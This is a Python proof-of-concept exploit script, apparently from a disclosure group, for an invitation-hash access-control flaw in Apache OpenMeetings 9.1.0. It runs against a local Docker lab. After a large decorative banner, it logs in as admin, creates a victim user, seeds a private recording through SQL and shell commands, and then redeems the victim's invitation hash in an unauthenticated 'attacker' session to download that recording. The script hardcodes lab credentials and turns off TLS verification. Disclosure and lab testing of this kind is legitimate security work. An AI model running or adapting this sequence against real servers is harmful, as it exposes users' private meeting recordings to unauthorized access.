#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: openmeetings-invite-recording-acl (High: 7.5)
#  Vendor: Apache OpenMeetings (ASF)
#  Versions: OpenMeetings 9.1.0
#  Impact: Type.USER invitation session is invitee for recording MP4 ACL
#  Requires: invitation hash, loopback 127.0.0.1:18156
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "openmeetings-invite-recording-acl"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove OpenMeetings 9.1.0 Type.USER invitation session is the invitee for recording ACL."""


import http.cookiejar
import json
import os
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone
from http.client import HTTPMessage
from pathlib import Path
from typing import Any

WITNESS = "OPENMEETINGS-INVITE-RECORDING-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "om-g6-invite")
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18156
BASE = f"https://{HOST}:{PORT}/openmeetings"
SVC = f"{BASE}/services"
ADMIN_USER = "om_admin"
ADMIN_PASS = "1Q2w3e4r5t^y"
VICTIM_LOGIN = "omown001"
VICTIM_PASS = "VicRec9!LabPass"
VICTIM_EMAIL = "omown001@example.com"
SSL_CTX = ssl._create_unverified_context()


class HttpResponse:
    def __init__(self, status: int, url: str, headers: HTTPMessage, body: bytes) -> None:
        self.status = status
        self.url = url
        self.headers = headers
        self.body = body

    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def json(self) -> Any:
        return json.loads(self.text() or "null")


class Session:
    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        https = urllib.request.HTTPSHandler(context=SSL_CTX)
        self.opener = urllib.request.build_opener(https, urllib.request.HTTPCookieProcessor(self.jar))

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        data: bytes | None = None,
        timeout: int = 60,
    ) -> HttpResponse:
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                return HttpResponse(resp.status, resp.geturl(), resp.headers, resp.read())
        except urllib.error.HTTPError as e:
            return HttpResponse(e.code, url, e.headers or HTTPMessage(), e.read() or b"")


def fail(reason: str) -> None:
    print(f"FAIL {WITNESS} {reason}")
    sys.exit(1)


def unwrap(obj: Any, *keys: str) -> Any:
    if not isinstance(obj, dict):
        return obj
    for key in keys:
        if key in obj:
            return obj[key]
    return obj


def compose(*args: str, input_bytes: bytes | None = None) -> str:
    cmd = ["docker", "compose", "-p", COMPOSE_PROJECT, "-f", str(HERE / "docker-compose.yml"), *args]
    proc = subprocess.run(cmd, input=input_bytes, capture_output=True)
    if proc.returncode != 0:
        err = (proc.stderr or b"").decode("utf-8", errors="replace").strip()
        fail(f"compose-{' '.join(args)} {err[:240]}")
    return (proc.stdout or b"").decode("utf-8", errors="replace")


def mysql(sql: str) -> str:
    last_err = ""
    for client in ("mariadb", "mysql"):
        cmd = [
            "docker",
            "compose",
            "-p",
            COMPOSE_PROJECT,
            "-f",
            str(HERE / "docker-compose.yml"),
            "exec",
            "-T",
            "db",
            client,
            "-uom_admin",
            "-p12345",
            "-N",
            "-B",
            "openmeetings",
            "-e",
            sql,
        ]
        proc = subprocess.run(cmd, capture_output=True)
        if proc.returncode == 0:
            return (proc.stdout or b"").decode("utf-8", errors="replace").strip()
        last_err = (proc.stderr or b"").decode("utf-8", errors="replace").strip()
    fail(f"mysql {last_err[:240]}")
    raise SystemExit(1)


def post_form(session: Session, url: str, fields: dict[str, str], timeout: int = 60) -> HttpResponse:
    body = urllib.parse.urlencode(fields).encode()
    return session.request(
        "POST",
        url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
        timeout=timeout,
    )


def login(session: Session, user: str, password: str) -> str:
    resp = post_form(session, f"{SVC}/user/login", {"user": user, "pass": password})
    if resp.status != 200:
        fail(f"login-http-{resp.status}")
    try:
        payload = unwrap(resp.json(), "serviceResult")
    except json.JSONDecodeError:
        fail(f"login-not-json {resp.text()[:180]}")
    if not isinstance(payload, dict) or payload.get("type") != "SUCCESS":
        fail(f"login-failed {payload}")
    sid = payload.get("message")
    if not sid:
        fail("login-empty-sid")
    print(f"IOC login user={user} sid={str(sid)[:8]}...")
    return str(sid)


def lookup_user_id(login: str) -> int | None:
    row = mysql(
        "SELECT id FROM om_user WHERE login = "
        f"'{login}' AND deleted = 0 ORDER BY id ASC LIMIT 1"
    )
    if row.isdigit():
        return int(row)
    return None


def add_victim(session: Session, sid: str) -> int:
    existing = lookup_user_id(VICTIM_LOGIN)
    if existing is not None:
        utype = mysql(f"SELECT type FROM om_user WHERE id = {existing}")
        print(f"IOC victim id={existing} login={VICTIM_LOGIN} type={utype} reused=1")
        if utype != "USER":
            fail(f"victim-not-type-user {utype}")
        return existing
    user = {
        "login": VICTIM_LOGIN,
        "password": VICTIM_PASS,
        "firstname": "Owner",
        "lastname": "Lab",
        "type": "USER",
        "languageId": 1,
        "timeZoneId": "UTC",
        "address": {"email": VICTIM_EMAIL, "country": "US"},
    }
    resp = post_form(
        session,
        f"{SVC}/user/?sid={urllib.parse.quote(sid)}",
        {"user": json.dumps(user), "confirm": "false"},
    )
    if resp.status != 200:
        fail(f"add-user-http-{resp.status} {resp.text()[:240]}")
    try:
        payload = unwrap(resp.json(), "userDTO")
    except json.JSONDecodeError:
        fail(f"add-user-not-json {resp.text()[:180]}")
    if not isinstance(payload, dict) or not payload.get("id"):
        fail(f"add-user-failed {payload}")
    victim_id = int(payload["id"])
    print(f"IOC victim id={victim_id} login={VICTIM_LOGIN} type={payload.get('type')}")
    if payload.get("type") != "USER":
        fail(f"victim-not-type-user {payload.get('type')}")
    return victim_id


def seed_recording(victim_id: int) -> int:
    rec_hash = str(uuid.uuid4())
    payload = f"lab-mp4-{WITNESS}\n"
    remote = f"/opt/omdata/streams/hibernate/{rec_hash}.mp4"
    compose(
        "exec",
        "-T",
        "om",
        "bash",
        "-c",
        "mkdir -p /opt/omdata/streams/hibernate && "
        f"printf '%s' '{payload}' > {remote} && chmod 644 {remote}",
    )
    cols = mysql("SHOW COLUMNS FROM om_file")
    colnames = {line.split("\t")[0] for line in cols.splitlines() if line.strip()}
    fields = {
        "name": "'vic-private-rec'",
        "hash": f"'{rec_hash}'",
        "owner_id": str(victim_id),
        "inserted_by": str(victim_id),
        "type": "'RECORDING'",
        "page_count": "1",
        "deleted": "0",
        "inserted": "NOW()",
    }
    if "status" in colnames:
        fields["status"] = "'PROCESSED'"
    if "notified" in colnames:
        fields["notified"] = "0"
    if "is_interview" in colnames:
        fields["is_interview"] = "0"
    if "comment" in colnames:
        fields["comment"] = "'lab'"
    if "filesize" in colnames:
        fields["filesize"] = str(len(payload.encode()))
    if "DTYPE" in colnames:
        fields["DTYPE"] = "'Recording'"
    insert_sql = "INSERT INTO om_file ({cols}) VALUES ({vals})".format(
        cols=", ".join(fields),
        vals=", ".join(fields.values()),
    )
    # LAST_INSERT_ID() is session-scoped; each compose exec is a new client.
    mysql(insert_sql)
    row = mysql(
        "SELECT id, owner_id, type, deleted, DTYPE FROM om_file "
        f"WHERE hash = '{rec_hash}' LIMIT 1"
    )
    parts = row.split("\t") if row else []
    rec_id = parts[0] if parts else ""
    if not rec_id.isdigit() or int(rec_id) <= 0:
        fail(f"seed-recording-id {row}")
    disk = compose(
        "exec",
        "-T",
        "om",
        "bash",
        "-c",
        f"test -s {remote} && wc -c < {remote}",
    ).strip()
    print(
        f"IOC recording id={rec_id} hash={rec_hash} "
        f"owner/type/deleted/dtype={','.join(parts[1:])} bytes={disk}"
    )
    return int(rec_id)


def create_user_invite(session: Session, sid: str, victim_id: int) -> None:
    now = datetime.now(timezone.utc)
    start = (now - timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%S+0000")
    end = (now + timedelta(hours=2)).strftime("%Y-%m-%dT%H:%M:%S+0000")
    appointment = {
        "title": "lab-g6-invite",
        "description": "lab",
        "start": start,
        "end": end,
        "reminder": "EMAIL",
        "languageId": 1,
        "passwordProtected": False,
        "connectedEvent": False,
        "reminderEmailSend": False,
        "room": {
            "name": "lab-g6-room",
            "comment": "lab",
            "type": "CONFERENCE",
            "capacity": 8,
            "appointment": True,
            "isPublic": False,
            "demo": False,
            "closed": False,
            "moderated": False,
            "allowUserQuestions": False,
            "allowRecording": False,
            "waitRecording": False,
            "audioOnly": True,
        },
        "meetingMembers": [{"user": {"id": victim_id}}],
    }
    resp = post_form(
        session,
        f"{SVC}/calendar/?sid={urllib.parse.quote(sid)}",
        {"appointment": json.dumps(appointment)},
        timeout=90,
    )
    if resp.status != 200:
        fail(f"calendar-http-{resp.status} {resp.text()[:240]}")
    try:
        payload = unwrap(resp.json(), "appointmentDTO")
    except json.JSONDecodeError:
        fail(f"calendar-not-json {resp.text()[:180]}")
    if not isinstance(payload, dict) or not payload.get("id"):
        fail(f"calendar-failed {payload}")
    print(f"IOC calendar id={payload.get('id')} reminder={payload.get('reminder')}")


def invite_hash_for_victim(victim_id: int) -> str:
    row = mysql(
        "SELECT i.hash, u.type, u.login FROM invitation i "
        f"JOIN om_user u ON u.id = i.invitee_id WHERE i.invitee_id = {victim_id} "
        "AND i.deleted = 0 ORDER BY i.id DESC LIMIT 1"
    )
    if not row:
        fail("no-type-user-invitation")
    parts = row.split("\t")
    if len(parts) < 3:
        fail(f"invite-row {row}")
    inv_hash, user_type, login = parts[0], parts[1], parts[2]
    print(f"IOC invite hash={inv_hash} invitee_type={user_type} login={login}")
    if user_type != "USER":
        fail(f"invitee-not-type-user {user_type}")
    if login != VICTIM_LOGIN:
        fail(f"invitee-not-victim {login}")
    return inv_hash


def contact_hash(session: Session, sid: str) -> str:
    rooms_resp = session.request("GET", f"{SVC}/room/public/CONFERENCE?sid={urllib.parse.quote(sid)}")
    room_id = 1
    if rooms_resp.status == 200:
        try:
            rooms = unwrap(rooms_resp.json(), "roomDTO", "roomDTOList")
            if isinstance(rooms, dict) and rooms.get("id"):
                room_id = int(rooms["id"])
            elif isinstance(rooms, list) and rooms and isinstance(rooms[0], dict) and rooms[0].get("id"):
                room_id = int(rooms[0]["id"])
        except json.JSONDecodeError:
            pass
    invite = {
        "email": "guest@example.com",
        "firstname": "Guest",
        "lastname": "Contact",
        "message": "lab",
        "subject": "lab",
        "roomId": room_id,
        "passwordProtected": False,
        "valid": "ENDLESS",
        "languageId": 1,
    }
    qs = urllib.parse.urlencode(
        {"sid": sid, "invite": json.dumps(invite), "sendmail": "false"}
    )
    resp = session.request("POST", f"{SVC}/room/hash?{qs}", data=b"", timeout=60)
    if resp.status != 200:
        fail(f"contact-hash-http-{resp.status} {resp.text()[:240]}")
    try:
        payload = unwrap(resp.json(), "serviceResult")
    except json.JSONDecodeError:
        fail(f"contact-hash-not-json {resp.text()[:180]}")
    if not isinstance(payload, dict) or payload.get("type") != "SUCCESS":
        fail(f"contact-hash-failed {payload}")
    chash = str(payload.get("message") or "")
    if not chash:
        fail("contact-hash-empty")
    print(f"IOC contact-hash {chash}")
    return chash


def get_recording(session: Session, rec_id: int) -> HttpResponse:
    return session.request("GET", f"{BASE}/recordings/mp4/{rec_id}", timeout=30)


def redeem(session: Session, inv_hash: str) -> HttpResponse:
    return session.request("GET", f"{BASE}/hash?invitation={urllib.parse.quote(inv_hash)}", timeout=60)


def main() -> None:
    admin = Session()
    sid = login(admin, ADMIN_USER, ADMIN_PASS)
    victim_id = add_victim(admin, sid)
    rec_id = seed_recording(victim_id)
    create_user_invite(admin, sid, victim_id)
    user_hash = invite_hash_for_victim(victim_id)

    unauth = Session()
    unauth_rec = get_recording(unauth, rec_id)
    print(f"IOC unauth recording http={unauth_rec.status} bytes={len(unauth_rec.body)}")
    if WITNESS.encode() in unauth_rec.body:
        fail("unauth-got-bytes")

    contact = Session()
    chash = contact_hash(admin, sid)
    cpage = redeem(contact, chash)
    print(f"IOC contact redeem http={cpage.status} url={cpage.url}")
    crec = get_recording(contact, rec_id)
    print(f"IOC contact recording http={crec.status} bytes={len(crec.body)}")
    if WITNESS.encode() in crec.body:
        fail("CONTACT-only")

    attacker = Session()
    page = redeem(attacker, user_hash)
    print(f"IOC user-invite redeem http={page.status} url={page.url} bytes={len(page.body)}")
    if page.status >= 400:
        fail(f"hash-redeem-http-{page.status}")
    rec = get_recording(attacker, rec_id)
    print(f"IOC user-invite recording http={rec.status} bytes={len(rec.body)} ctype={rec.headers.get('Content-Type')}")
    if rec.status != 200:
        fail(f"recording-http-{rec.status}")
    if WITNESS.encode() not in rec.body:
        fail("no-bytes")
    print(f"SUCCESS {WITNESS}")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception {type(exc).__name__}: {exc}")

